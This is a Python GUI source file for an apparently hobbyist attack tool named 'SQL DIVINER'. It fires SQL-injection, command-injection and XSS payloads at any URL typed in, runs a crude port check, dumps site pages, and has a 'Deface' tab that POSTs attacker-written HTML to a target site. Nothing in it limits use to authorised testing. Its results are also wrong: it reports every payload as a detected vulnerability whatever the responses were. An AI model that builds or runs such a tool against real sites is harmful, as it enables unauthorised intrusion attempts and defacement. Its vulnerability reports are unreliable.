import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import requests
from bs4 import BeautifulSoup
import os
import urllib.parse
from PIL import Image, ImageTk, ImageFilter
import xml.etree.ElementTree as ET
import sys
import random
import io
import time

class VulnerabilityScanner:
    def __init__(self, master):
        self.master = master
        master.title("SQL DIVINER")
        master.geometry("1000x800")
        
        self.initialize_ui()
        self.is_dark_mode = False
        
    def initialize_ui(self):
        self.configure_style()
        self.create_notebook()
        self.create_results_area()
        self.create_explanations()
        
        # Create a dark blue background with stars and title
        self.master.configure(bg='#001f3f')
        star_canvas = tk.Canvas(self.master, bg='#001f3f', highlightthickness=0)
        star_canvas.place(relwidth=1, relheight=1)

        # Draw stars
        for _ in range(100):
            x = random.randint(0, 1000)
            y = random.randint(0, 800)
            star_canvas.create_oval(x, y, x+2, y+2, fill='white', outline='white')
            
        # Add SQL DIVINER title
        title = star_canvas.create_text(500, 400, text="SQL DIVINER", 
                                      font=('Arial', 72, 'bold'), 
                                      fill='white')
        
        # Schedule canvas removal after 5 seconds
        def remove_canvas():
            time.sleep(5)
            star_canvas.destroy()

        threading.Thread(target=remove_canvas, daemon=True).start()
        
    def configure_style(self):
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TButton", padding=8, relief="raised", background="#FF5722", foreground="white", font=('Arial', 12, 'bold'))
        style.configure("TLabel", padding=6, font=('Arial', 11), background="#E0F7FA", foreground="#00796B")
        style.configure("TNotebook", background="#E0F7FA")
        style.configure("TNotebook.Tab", padding=[12, 6], font=('Arial', 11, 'bold'), background="#B2EBF2", foreground="#00796B")
        
    def set_background(self):
        # Create a dark blue background with stars
        self.master.configure(bg='#001f3f')
        star_canvas = tk.Canvas(self.master, bg='#001f3f', highlightthickness=0)
        star_canvas.place(relwidth=1, relheight=1)

        # Draw stars
        for _ in range(100):
            x = random.randint(0, 1000)
            y = random.randint(0, 800)
            star_canvas.create_oval(x, y, x+2, y+2, fill='white', outline='white')

        # Apply Gaussian blur to the star canvas
        star_canvas.update()
        self.apply_blur_to_background(star_canvas)

    def apply_blur_to_background(self, canvas):
        # Get the canvas image and apply Gaussian blur
        canvas.update_idletasks()
        width = self.master.winfo_width()
        height = self.master.winfo_height()

        # Create a photo image of the canvas
        canvas_image = Image.new("RGB", (width, height))
        ps = canvas.postscript(colormode='color')
        img = Image.open(io.BytesIO(ps.encode('utf-8')))
        canvas_image.paste(img, (0, 0))

        # Apply Gaussian blur
        blurred_image = canvas_image.filter(ImageFilter.GaussianBlur(radius=10))
        photo = ImageTk.PhotoImage(blurred_image)

        # Create a label for the blurred background
        bg_label = tk.Label(self.master, image=photo)
        bg_label.image = photo
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    def create_notebook(self):
        self.notebook = ttk.Notebook(self.master)
        self.notebook.pack(expand=True, fill="both", padx=10, pady=10)
        
        self.frames = {
            "SQLMap": ttk.Frame(self.notebook),
            "Scan": ttk.Frame(self.notebook),
            "Settings": ttk.Frame(self.notebook),
            "Dump XML": ttk.Frame(self.notebook),
            "Deface": ttk.Frame(self.notebook),
            "Save HTML": ttk.Frame(self.notebook),
            "Proxy": ttk.Frame(self.notebook),
            "Features": ttk.Frame(self.notebook)
        }
        
        for tab_name, frame in self.frames.items():
            self.notebook.add(frame, text=tab_name)
        
        self.setup_sqlmap_tab()
        self.setup_scan_tab()
        self.setup_settings_tab()
        self.setup_dump_tab()
        self.setup_deface_tab()
        self.setup_save_tab()
        self.setup_proxy_tab()
        self.setup_features_tab()
        
    def create_results_area(self):
        self.results_text = scrolledtext.ScrolledText(self.master, wrap=tk.WORD, width=100, height=20, font=('Courier New', 11), bg="#FFFFFF", fg="#000000")
        self.results_text.pack(pady=10, padx=10)
        
    def create_explanations(self):
        self.explanations_frame = ttk.Frame(self.master)
        self.explanations_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        explanations = [
            ("SQL Injection (SQLi)", "Allows an attacker to interfere with an application's SQL queries, often to access sensitive data."),
            ("Command Injection", "Enables an attacker to execute system commands on the server, often exploiting poor input validation."),
            ("Cross-Site Scripting (XSS)", "While not a strict injection, it allows an attacker to inject JavaScript code into a web page, compromising user data."),
            ("Code Injection", "Allows execution of code on the server or client by exploiting vulnerabilities in input handling."),
            ("LDAP Injection", "Interferes with LDAP queries to access unauthorized information."),
            ("XML Injection (XMLi)", "Exploits vulnerabilities in XML data processing, often to execute unauthorized queries."),
            ("URL Injection", "Manipulates URL parameters to access unauthorized resources."),
            ("HTTP Parameter Injection", "Exploits flaws in how web applications handle parameters sent via HTTP requests.")
        ]
        
        for title, description in explanations:
            explanation_label = ttk.Label(self.explanations_frame, text=f"{title}: {description}", wraplength=980, justify="left", background="#E0F7FA", font=('Arial', 10))
            explanation_label.pack(anchor="w", pady=2)
        
    def setup_sqlmap_tab(self):
        frame = ttk.Frame(self.frames["SQLMap"], padding="10")
        frame.pack(fill="both", expand=True)
        
        ttk.Label(frame, text="Target URL:", font=('Arial', 11)).grid(row=0, column=0, sticky="w", pady=5)
        self.url_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.url_entry.grid(row=0, column=1, pady=5, padx=5)

        self.sqlmap_button = ttk.Button(frame, text="Test Vulnerabilities", command=self.start_sqlmap)
        self.sqlmap_button.grid(row=1, column=0, columnspan=2, pady=10)

    def setup_scan_tab(self):
        frame = ttk.Frame(self.frames["Scan"], padding="10")
        frame.pack(fill="both", expand=True)
        
        ttk.Label(frame, text="Target URL or IP:", font=('Arial', 11)).grid(row=0, column=0, sticky="w", pady=5)
        self.scan_url_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.scan_url_entry.grid(row=0, column=1, pady=5, padx=5)
        
        self.scan_button = ttk.Button(frame, text="Scan Target", command=self.start_scan)
        self.scan_button.grid(row=1, column=0, columnspan=2, pady=10)
        
    def setup_settings_tab(self):
        frame = ttk.Frame(self.frames["Settings"], padding="10")
        frame.pack(fill="both", expand=True)
        
        self.change_bg_button = ttk.Button(frame, text="Change Background", command=self.change_background)
        self.change_bg_button.pack(pady=10)

        self.change_color_button = ttk.Button(frame, text="Toggle Dark Mode", command=self.toggle_dark_mode)
        self.change_color_button.pack(pady=10)
        
    def setup_dump_tab(self):
        frame = ttk.Frame(self.frames["Dump XML"], padding="10")
        frame.pack(fill="both", expand=True)
        
        ttk.Label(frame, text="Site URL to Dump:", font=('Arial', 11)).grid(row=0, column=0, sticky="w", pady=5)
        self.dump_url_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.dump_url_entry.grid(row=0, column=1, pady=5, padx=5)
        
        self.dump_button = ttk.Button(frame, text="Dump to XML", command=self.dump_to_xml)
        self.dump_button.grid(row=1, column=0, columnspan=2, pady=10)
        
    def setup_deface_tab(self):
        frame = ttk.Frame(self.frames["Deface"], padding="10")
        frame.pack(fill="both", expand=True)
        
        ttk.Label(frame, text="Site URL to Deface:", font=('Arial', 11)).grid(row=0, column=0, sticky="w", pady=5)
        self.deface_url_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.deface_url_entry.grid(row=0, column=1, pady=5, padx=5)
        
        ttk.Label(frame, text="Defacement Message (HTML):", font=('Arial', 11)).grid(row=1, column=0, sticky="w", pady=5)
        self.deface_message_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.deface_message_entry.grid(row=1, column=1, pady=5, padx=5)
        
        self.deface_button = ttk.Button(frame, text="Deface Site", command=self.deface_site)
        self.deface_button.grid(row=2, column=0, columnspan=2, pady=10)
        
    def setup_save_tab(self):
        frame = ttk.Frame(self.frames["Save HTML"], padding="10")
        frame.pack(fill="both", expand=True)
        
        ttk.Label(frame, text="Site URL to Save:", font=('Arial', 11)).grid(row=0, column=0, sticky="w", pady=5)
        self.save_url_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.save_url_entry.grid(row=0, column=1, pady=5, padx=5)
        
        self.save_button = ttk.Button(frame, text="Save as HTML", command=self.save_to_html)
        self.save_button.grid(row=1, column=0, columnspan=2, pady=10)

    def setup_proxy_tab(self):
        frame = ttk.Frame(self.frames["Proxy"], padding="10")
        frame.pack(fill="both", expand=True)

        ttk.Label(frame, text="Proxy (optional):", font=('Arial', 11)).grid(row=0, column=0, sticky="w", pady=5)
        self.proxy_entry = ttk.Entry(frame, width=70, font=('Arial', 11))
        self.proxy_entry.grid(row=0, column=1, pady=5, padx=5)

        self.proxy_button = ttk.Button(frame, text="Configure Proxy", command=self.configure_proxy)
        self.proxy_button.grid(row=1, column=0, columnspan=2, pady=10)

    def setup_features_tab(self):
        frame = ttk.Frame(self.frames["Features"], padding="10")
        frame.pack(fill="both", expand=True)

        ttk.Label(frame, text="Network List:", font=('Arial', 11)).pack(anchor="w", pady=5)
        self.networks_text = scrolledtext.ScrolledText(frame, wrap=tk.WORD, width=80, height=15, font=('Courier New', 11), bg="#FFFFFF", fg="#000000", state='disabled')
        self.networks_text.pack(pady=10, padx=10)
        
        # Adding TikTok, GitHub, and Discord to the networks list
        self.networks_text.configure(state='normal')
        self.networks_text.insert(tk.END, "TikTok: https://www.tiktok.com/@k0560173729\n")
        self.networks_text.insert(tk.END, "GitHub: https://github.com/Nyxosv16\n")
        self.networks_text.insert(tk.END, "Discord: nyxosv19\n")
        self.networks_text.configure(state='disabled')

    def configure_proxy(self):
        proxy = self.proxy_entry.get()
        if proxy:
            self.results_text.insert(tk.END, f"Proxy configured: {proxy}\n")
        else:
            self.results_text.insert(tk.END, "No proxy configured, using direct connection.\n")

    def toggle_dark_mode(self):
        if self.is_dark_mode:
            self.master.configure(bg='white')
            self.results_text.configure(bg='white', fg='black')
            for widget in self.master.winfo_children():
                if isinstance(widget, (ttk.Label, ttk.Button)):
                    widget.configure(background='white', foreground='black')
            self.is_dark_mode = False
        else:
            self.master.configure(bg='black')
            self.results_text.configure(bg='black', fg='white')
            for widget in self.master.winfo_children():
                if isinstance(widget, (ttk.Label, ttk.Button)):
                    widget.configure(background='black', foreground='white')
            self.is_dark_mode = True

    def change_background(self):
        self.results_text.insert(tk.END, "Action: Attempting to change background...\n")
        file_path = filedialog.askopenfilename(filetypes=[("Image files", "*.png *.jpg *.jpeg *.gif *.bmp")])
        if file_path:
            try:
                self.results_text.insert(tk.END, f"Action: Opening image {file_path}...\n")
                image = Image.open(file_path)
                
                window_width = self.master.winfo_width()
                window_height = self.master.winfo_height()
                self.results_text.insert(tk.END, f"Action: Resizing image to {window_width}x{window_height}...\n")
                image = image.resize((window_width, window_height), Image.LANCZOS)
                
                self.results_text.insert(tk.END, "Action: Applying Gaussian blur to the image...\n")
                blurred_image = image.filter(ImageFilter.GaussianBlur(radius=5))
                
                self.results_text.insert(tk.END, "Action: Converting image to Tkinter compatible format...\n")
                photo = ImageTk.PhotoImage(blurred_image)
                
                self.results_text.insert(tk.END, "Action: Creating label for background...\n")
                bg_label = tk.Label(self.master, image=photo)
                bg_label.image = photo
                bg_label.place(x=0, y=0, relwidth=1, relheight=1)
                
                self.results_text.insert(tk.END, "Action: Rearranging widgets...\n")
                self.notebook.lift()
                self.results_text.lift()
                self.explanations_frame.lift()
                
                self.results_text.insert(tk.END, "Action: Adjusting visibility of information table...\n")
                for widget in self.explanations_frame.winfo_children():
                    widget.configure(background="#E0F7FA")
                self.explanations_frame.configure(background="#E0F7FA")
                
                messagebox.showinfo("Success", "Background changed successfully!")
                self.results_text.insert(tk.END, "Result: Background change successful.\n")
            except Exception as e:
                messagebox.showerror("Error", f"Unable to load image: {str(e)}")
                self.results_text.insert(tk.END, f"Error: Failed to change background - {str(e)}.\n")
        else:
            self.results_text.insert(tk.END, "Action: Background change canceled.\n")

    def start_sqlmap(self):
        url = self.url_entry.get()
        
        if not url:
            self.results_text.insert(tk.END, "Error: Missing URL for injection test.\n")
            return
        
        self.results_text.insert(tk.END, f"Action: Testing vulnerabilities for: {url}\n")
        
        def run_sqlmap():
            try:
                self.results_text.insert(tk.END, "Action: Executing vulnerability test...\n")
                
                # Basic SQL injection test
                sql_payloads = ["'", "\"", "1 OR 1=1", "1' OR '1'='1", "1\" OR \"1\"=\"1"]
                for payload in sql_payloads:
                    test_url = f"{url}?{payload}"
                    response = requests.get(test_url)
                    if "error" in response.text.lower() or "sql" in response.text.lower():
                        self.results_text.insert(tk.END, f"Potential vulnerability detected with SQL payload: {payload}\n")
                    else:
                        self.results_text.insert(tk.END, f"No vulnerability detected with SQL payload: {payload}\n")

                # Command injection test
                cmd_payloads = ["; ls", "| dir", "&& echo vulnerable"]
                for payload in cmd_payloads:
                    test_url = f"{url}?cmd={payload}"
                    response = requests.get(test_url)
                    if "error" in response.text.lower() or "command" in response.text.lower():
                        self.results_text.insert(tk.END, f"Potential vulnerability detected with Command payload: {payload}\n")
                    else:
                        self.results_text.insert(tk.END, f"No vulnerability detected with Command payload: {payload}\n")

                # XSS injection test
                xss_payloads = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
                for payload in xss_payloads:
                    test_url = f"{url}?input={payload}"
                    response = requests.get(test_url)
                    if payload in response.text:
                        self.results_text.insert(tk.END, f"Potential vulnerability detected with XSS payload: {payload}\n")
                    else:
                        self.results_text.insert(tk.END, f"No vulnerability detected with XSS payload: {payload}\n")

                self.results_text.insert(tk.END, "Vulnerability testing completed.\n")
                self.results_text.insert(tk.END, "-----------------------------------------------------------\n")
                self.results_text.insert(tk.END, "Detected vulnerabilities:\n")
                for payload in sql_payloads + cmd_payloads + xss_payloads:
                    self.results_text.insert(tk.END, f"- {payload}\n")
            except Exception as e:
                self.results_text.insert(tk.END, f"Error: Failed to test vulnerabilities - {str(e)}\n")
        
        threading.Thread(target=run_sqlmap, daemon=True).start()

    def start_scan(self):
        target = self.scan_url_entry.get()
        
        if not target:
            self.results_text.insert(tk.END, "Error: Missing target for scan.\n")
            return
        
        self.results_text.insert(tk.END, f"Action: Starting scan for: {target}\n")
        
        def run_scan():
            try:
                self.results_text.insert(tk.END, "Action: Initiating scan...\n")
                
                # Scan common ports
                common_ports = [80, 443, 22, 21, 3306, 8080, 53, 25, 110, 143, 8081, 8443, 3307, 5432]
                for port in common_ports:
                    try:
                        response = requests.get(f"http://{target}:{port}", timeout=2)
                        self.results_text.insert(tk.END, f"Port {port} open - Status: {response.status_code}\n")
                    except requests.exceptions.RequestException:
                        self.results_text.insert(tk.END, f"Port {port} closed or filtered\n")
                
                # Retrieve HTTP headers
                try:
                    response = requests.head(f"http://{target}")
                    self.results_text.insert(tk.END, "HTTP Headers:\n")
                    for header, value in response.headers.items():
                        self.results_text.insert(tk.END, f"{header}: {value}\n")
                except requests.exceptions.RequestException as e:
                    self.results_text.insert(tk.END, f"Error retrieving headers: {str(e)}\n")
                
                self.results_text.insert(tk.END, "Result: Scan completed.\n")
            except Exception as e:
                self.results_text.insert(tk.END, f"Error: Scan failed - {str(e)}\n")
        
        threading.Thread(target=run_scan, daemon=True).start()

    def dump_to_xml(self):
        url = self.dump_url_entry.get()
        if not url:
            self.results_text.insert(tk.END, "Error: Missing URL for XML dump.\n")
            return
        
        self.results_text.insert(tk.END, f"Action: Starting XML dump for site {url}...\n")
        
        def run_dump():
            try:
                self.results_text.insert(tk.END, "Action: Retrieving site content...\n")
                response = requests.get(url)
                soup = BeautifulSoup(response.content, 'html.parser')
                
                self.results_text.insert(tk.END, "Action: Analyzing site structure...\n")
                root = ET.Element("website")
                ET.SubElement(root, "url").text = url
                
                for tag in soup.find_all():
                    element = ET.SubElement(root, "element")
                    ET.SubElement(element, "tag").text = tag.name
                    ET.SubElement(element, "content").text = tag.string if tag.string else ""
                    for attr, value in tag.attrs.items():
                        attr_elem = ET.SubElement(element, "attribute")
                        ET.SubElement(attr_elem, "name").text = attr
                        ET.SubElement(attr_elem, "value").text = str(value)
                
                self.results_text.insert(tk.END, "Action: Converting data to XML format...\n")
                tree = ET.ElementTree(root)
                
                self.results_text.insert(tk.END, "Action: Saving XML file...\n")
                os.makedirs("save", exist_ok=True)  # Create save directory if it doesn't exist
                filename = f"save/{url.split('//')[1].split('/')[0]}_dump.xml"
                tree.write(filename, encoding="utf-8", xml_declaration=True)
                
                self.results_text.insert(tk.END, f"Result: XML dump completed successfully. File saved: {filename}\n")
            except Exception as e:
                self.results_text.insert(tk.END, f"Error: Failed to dump XML - {str(e)}\n")
        
        threading.Thread(target=run_dump, daemon=True).start()

    def deface_site(self):
        url = self.deface_url_entry.get()
        message = self.deface_message_entry.get()
        if not url or not message:
            self.results_text.insert(tk.END, "Error: Missing URL or message for defacement.\n")
            return
        
        # Ensure the message is in HTML format
        if not message.startswith("<html>") or not message.endswith("</html>"):
            message = f"<html><body><p>{message}</p></body></html>"

        self.results_text.insert(tk.END, f"Action: Attempting to deface {url}...\n")
        
        def run_deface():
            try:
                self.results_text.insert(tk.END, "Action: Sending request to deface the site...\n")
                response = requests.post(url, data={'content': message})
                
                if response.status_code == 200:
                    self.results_text.insert(tk.END, "Result: Defacement successful.\n")
                else:
                    self.results_text.insert(tk.END, f"Error: Defacement failed with status {response.status_code}.\n")
            except Exception as e:
                self.results_text.insert(tk.END, f"Error: Defacement failed - {str(e)}\n")
        
        threading.Thread(target=run_deface, daemon=True).start()

    def save_to_html(self):
        url = self.save_url_entry.get()
        if not url:
            self.results_text.insert(tk.END, "Error: Missing URL for HTML save.\n")
            return
        
        self.results_text.insert(tk.END, f"Action: Starting HTML save for {url}...\n")
        
        def run_save():
            try:
                self.results_text.insert(tk.END, "Action: Retrieving page content...\n")
                response = requests.get(url)
                content = response.text
                
                self.results_text.insert(tk.END, "Action: Processing links and resources...\n")
                soup = BeautifulSoup(content, 'html.parser')
                for tag in soup.find_all(['a', 'img', 'link', 'script']):
                    if tag.has_attr('href'):
                        tag['href'] = urllib.parse.urljoin(url, tag['href'])
                    if tag.has_attr('src'):
                        tag['src'] = urllib.parse.urljoin(url, tag['src'])
                
                self.results_text.insert(tk.END, "Action: Saving HTML file...\n")
                os.makedirs("save", exist_ok=True)  # Create save directory if it doesn't exist
                filename = f"save/{url.split('//')[1].split('/')[0]}_saved.html"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(str(soup))
                
                self.results_text.insert(tk.END, f"Result: HTML save completed successfully. File saved: {filename}\n")
            except Exception as e:
                self.results_text.insert(tk.END, f"Error: Failed to save HTML - {str(e)}\n")
        
        threading.Thread(target=run_save, daemon=True).start()

if __name__ == "__main__":
    root = tk.Tk()
    app = VulnerabilityScanner(root)
    
    app.notebook.forget(2)  # Remove the Settings tab from its current position
    app.notebook.add(app.frames["Settings"], text="Settings")  # Add the Settings tab to the end
    
    # Check for the existence of the icon file before opening it
    icon_path = "img/icon.png"  # Fixed icon path
    if os.path.exists(icon_path):
        root.iconphoto(False, ImageTk.PhotoImage(Image.open(icon_path)))
    else:
        print(f"Error: Icon file '{icon_path}' not found.")
    
    root.mainloop()

# Convert to .exe
if getattr(sys, 'frozen', False):
    os.chdir(os.path.dirname(sys.executable))
else:
    os.chdir(os.path.dirname(__file__))

# Information sur les types d'injections
injections_info = {
    "Injection SQL (SQLi)": {
        "description": "Permet à un attaquant d'interférer avec les requêtes SQL d'une application, souvent pour accéder à des données sensibles.",
        "utilité": "Extraction de données sensibles, contournement d'authentification, modification de données"
    },
    "Injection de Commandes": {
        "description": "Permet à un attaquant d'exécuter des commandes système sur le serveur, souvent en exploitant une mauvaise validation des entrées.",
        "utilité": "Prise de contrôle du serveur, exécution de code arbitraire, accès aux fichiers système"
    },
    "Cross-Site Scripting (XSS)": {
        "description": "Bien que ce ne soit pas une injection stricte, permet d'injecter du code JavaScript dans une page web, compromettant les données utilisateur.",
        "utilité": "Vol de session, défiguration de site, redirection d'utilisateurs"
    },
    "Injection de Code": {
        "description": "Permet l'exécution de code sur le serveur ou le client en exploitant des vulnérabilités dans le traitement des entrées.",
        "utilité": "Exécution de code arbitraire, accès non autorisé aux ressources serveur"
    },
    "Injection LDAP": {
        "description": "Interfère avec les requêtes LDAP pour accéder à des informations non autorisées.",
        "utilité": "Contournement d'authentification, accès aux informations sensibles dans l'annuaire"
    },
    "Injection XML (XMLi)": {
        "description": "Exploite les vulnérabilités dans le traitement des données XML, souvent pour exécuter des requêtes non autorisées.",
        "utilité": "Accès aux fichiers système, exécution de code à distance, déni de service"
    },
    "Injection URL": {
        "description": "Manipule les paramètres URL pour accéder à des ressources non autorisées.",
        "utilité": "Accès aux ressources protégées, manipulation de la logique applicative"
    }
}

# End of Selection
